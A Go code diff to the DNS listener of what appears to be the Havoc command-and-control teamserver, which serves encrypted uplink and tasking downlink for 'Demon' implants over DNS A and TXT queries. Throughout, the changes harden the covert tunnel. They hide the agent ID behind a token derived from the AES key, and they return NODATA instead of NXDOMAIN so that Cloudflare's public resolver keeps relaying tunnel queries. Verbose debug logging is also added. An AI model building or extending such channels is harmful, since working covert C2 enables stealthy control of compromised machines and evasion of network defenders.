@@ -31,13 +31,20 @@ type DNS struct {
 	server *dns.Server
 
 	mu        sync.Mutex
-	pending   map[string]*dnsSession // key: aid8+seq4 hex
-	responses map[string][]byte      // key: aid8 hex → queued encrypted response
+	pending   map[string]*dnsSession // key: seq4+tok8 hex
+	responses map[string][]byte      // key: tok8 hex → queued encrypted response
 }
 
-// sessionKey returns the reassembly map key for a pending packet.
-func sessionKey(aid uint32, seq uint16) string {
-	return fmt.Sprintf("%08x%04x", aid, seq)
+// tokenKey returns the map key for a response keyed by the per-session token.
+// The token is derived from the Demon's AES key — stable across chunks of one
+// session, unique per implant instance, and never exposes the agent ID in DNS.
+func tokenKey(tok uint32) string {
+	return fmt.Sprintf("%08x", tok)
+}
+
+// sessionKey returns the reassembly map key for a pending uplink (seq + token).
+func sessionKey(seq uint16, tok uint32) string {
+	return fmt.Sprintf("%04x%08x", seq, tok)
 }
 
 // Start binds the DNS server on both UDP and TCP.
@@ -68,7 +75,34 @@ func (d *DNS) Start() error {
 	d.server = udpSrv
 	logger.Info(fmt.Sprintf("DNS listener '%s' started on %s zone %s",
 		d.Config.Name, addr, d.Config.ZoneDomain))
+
+	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
+	d.Teamserver.EventAppend(pk)
+	d.Teamserver.EventBroadcast("", pk)
+
 	return nil
+}
+
+// dnsTypeName returns a human-readable DNS query type string.
+func dnsTypeName(qtype uint16) string {
+	switch qtype {
+	case dns.TypeA:
+		return "A"
+	case dns.TypeTXT:
+		return "TXT"
+	case dns.TypeAAAA:
+		return "AAAA"
+	case dns.TypeMX:
+		return "MX"
+	case dns.TypeNS:
+		return "NS"
+	case dns.TypeSOA:
+		return "SOA"
+	case dns.TypePTR:
+		return "PTR"
+	default:
+		return fmt.Sprintf("type%d", qtype)
+	}
 }
 
 // ServeDNS implements dns.Handler and is called for every DNS query
@@ -86,6 +120,8 @@ func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 	for _, q := range r.Question {
 		name := strings.ToLower(q.Name)
+		logger.Debug(fmt.Sprintf("DNS query: type=%-4s from=%s name=%s",
+			dnsTypeName(q.Qtype), remoteIP, name))
 
 		switch q.Qtype {
 		case dns.TypeA:
@@ -93,7 +129,16 @@ func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 			if rr != nil {
 				m.Answer = append(m.Answer, rr)
 			} else {
-				m.Rcode = dns.RcodeNameError // NXDOMAIN for invalid/unknown queries
+				// Return NODATA (NOERROR, empty answer) instead of NXDOMAIN for
+				// queries that don't match our 3-label uplink format. NXDOMAIN would
+				// trigger RFC 8020 NXDOMAIN-cut synthesis in Cloudflare's recursive
+				// resolver (1.1.1.1), which caches the NXDOMAIN for the token label
+				// (e.g. <tok8>.zone.forsec.pw.) and then synthesises NXDOMAIN for all
+				// sub-labels (<b32>.<meta8>.<tok8>.zone.forsec.pw.) without querying us.
+				// NODATA tells the resolver the name EXISTS but has no A record, so
+				// RFC 8020 cut does not apply and subsequent sub-label queries are
+				// forwarded to us normally.
+				logger.Debug(fmt.Sprintf("DNS query: type=A name=%s → NODATA (parse failed, suppressing NXDOMAIN)", name))
 			}
 		case dns.TypeTXT:
 			rr := d.handleDownlink(q, name)
@@ -102,7 +147,10 @@ func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 			// empty answer = "no data ready" — Demon retries on next cycle
 		default:
-			m.Rcode = dns.RcodeNameError
+			// Return NODATA for unsupported types (NS, AAAA, SOA, etc.) for the same
+			// RFC 8020 reason: NXDOMAIN on a parent label blocks all sub-label queries.
+			logger.Debug(fmt.Sprintf("DNS query: type=%s name=%s → NODATA (unsupported type)",
+				dnsTypeName(q.Qtype), name))
 		}
 	}
 
@@ -114,7 +162,7 @@ func (d *DNS) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 // to parseAgentRequest and the encrypted response is queued for downlink.
 // Returns an A RR ACK (0.0.0.1) on success, nil on invalid queries (→ NXDOMAIN).
 func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
-	chunk, seq, cid, tot, aid, err := dnsParseUploadFqdn(name, d.Config.ZoneDomain)
+	chunk, seq, cid, tot, tok, err := dnsParseUploadFqdn(name, d.Config.ZoneDomain)
 	if err != nil {
 		logger.Debug(fmt.Sprintf("DNS uplink parse error: %s (name=%s)", err.Error(), name))
 		return nil
@@ -125,8 +173,11 @@ func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
 		return nil
 	}
 
-	aidKey := fmt.Sprintf("%08x", aid)
-	sKey := sessionKey(aid, seq)
+	sKey := sessionKey(seq, tok)
+	tKey := tokenKey(tok)
+
+	logger.Debug(fmt.Sprintf("DNS uplink: seq=%04x cid=%02x tot=%02x tok=%08x chunk_len=%d sKey=%s tKey=%s",
+		seq, cid, tot, tok, len(chunk), sKey, tKey))
 
 	d.mu.Lock()
 	sess, ok := d.pending[sKey]
@@ -136,10 +187,15 @@ func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
 			total:  int(tot),
 		}
 		d.pending[sKey] = sess
+		logger.Debug(fmt.Sprintf("DNS uplink: new session sKey=%s tot=%d", sKey, tot))
 	}
 	if _, dup := sess.chunks[int(cid)]; !dup {
 		sess.chunks[int(cid)] = chunk
 		sess.received++
+		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s chunk cid=%02x stored, progress=%d/%d",
+			sKey, cid, sess.received, sess.total))
+	} else {
+		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s chunk cid=%02x duplicate, ignored", sKey, cid))
 	}
 	complete := sess.received >= sess.total
 	var fullPayload []byte
@@ -148,15 +204,21 @@ func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
 			fullPayload = append(fullPayload, sess.chunks[i]...)
 		}
 		delete(d.pending, sKey)
+		logger.Debug(fmt.Sprintf("DNS uplink: sKey=%s complete, total_bytes=%d, passing to parseAgentRequest",
+			sKey, len(fullPayload)))
 	}
 	d.mu.Unlock()
 
 	if complete {
-		resp, ok := parseAgentRequest(d.Teamserver, fullPayload, remoteIP)
+		resp, ok := parseAgentRequest(d.Teamserver, fullPayload, remoteIP, true, d.Config.Name)
 		if ok && resp.Len() > 0 {
 			d.mu.Lock()
-			d.responses[aidKey] = resp.Bytes()
+			d.responses[tKey] = resp.Bytes()
 			d.mu.Unlock()
+			logger.Debug(fmt.Sprintf("DNS uplink: response queued tKey=%s resp_len=%d", tKey, resp.Len()))
+		} else {
+			logger.Debug(fmt.Sprintf("DNS uplink: parseAgentRequest ok=%v resp_len=%d — no response queued for tKey=%s",
+				ok, resp.Len(), tKey))
 		}
 	}
 
@@ -178,20 +240,24 @@ func (d *DNS) handleUplink(q dns.Question, name, remoteIP string) dns.RR {
 // the Demon knows the response is complete. An empty TXT answer signals
 // "no data ready" and the Demon retries.
 func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
-	_, offset, aid, err := dnsParseDownlinkFqdn(name, d.Config.ZoneDomain)
+	seq, offset, tok, err := dnsParseDownlinkFqdn(name, d.Config.ZoneDomain)
 	if err != nil {
 		logger.Debug(fmt.Sprintf("DNS downlink parse error: %s (name=%s)", err.Error(), name))
 		return nil
 	}
 
-	aidKey := fmt.Sprintf("%08x", aid)
+	tKey := tokenKey(tok)
 
 	d.mu.Lock()
-	resp, ok := d.responses[aidKey]
+	resp, respFound := d.responses[tKey]
+	respLen := len(resp)
 	d.mu.Unlock()
 
-	if !ok || len(resp) == 0 {
-		// No data queued — return empty TXT
+	logger.Debug(fmt.Sprintf("DNS downlink poll: seq=%04x offset=%08x tok=%08x tKey=%s found=%v resp_len=%d",
+		seq, offset, tok, tKey, respFound, respLen))
+
+	if !respFound || respLen == 0 {
+		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s no data queued — returning empty TXT", tKey))
 		return &dns.TXT{
 			Hdr: dns.RR_Header{
 				Name:   q.Name,
@@ -204,12 +270,14 @@ func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
 	}
 
 	start := int(offset)
-	if start >= len(resp) {
+	if start >= respLen {
 		// Offset past end — all data already served; send sentinel
 		d.mu.Lock()
-		delete(d.responses, aidKey)
+		delete(d.responses, tKey)
 		d.mu.Unlock()
 		sentinel := base64.StdEncoding.EncodeToString([]byte{0xFF})
+		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d >= resp_len=%d — sending sentinel, deleting response",
+			tKey, start, respLen))
 		return &dns.TXT{
 			Hdr: dns.RR_Header{
 				Name:   q.Name,
@@ -222,9 +290,9 @@ func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
 	}
 
 	end := start + dnsTXTChunkSize
-	last := end >= len(resp)
+	last := end >= respLen
 	if last {
-		end = len(resp)
+		end = respLen
 	}
 
 	chunk := resp[start:end]
@@ -237,10 +305,14 @@ func (d *DNS) handleDownlink(q dns.Question, name string) dns.RR {
 		encoded = base64.StdEncoding.EncodeToString(withSentinel)
 
 		d.mu.Lock()
-		delete(d.responses, aidKey)
+		delete(d.responses, tKey)
 		d.mu.Unlock()
+		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d..%d LAST chunk (%d bytes + sentinel), encoded_len=%d — deleting response",
+			tKey, start, end, len(chunk), len(encoded)))
 	} else {
 		encoded = base64.StdEncoding.EncodeToString(chunk)
+		logger.Debug(fmt.Sprintf("DNS downlink: tKey=%s offset=%d..%d chunk (%d bytes), encoded_len=%d",
+			tKey, start, end, len(chunk), len(encoded)))
 	}
 
 	return &dns.TXT{
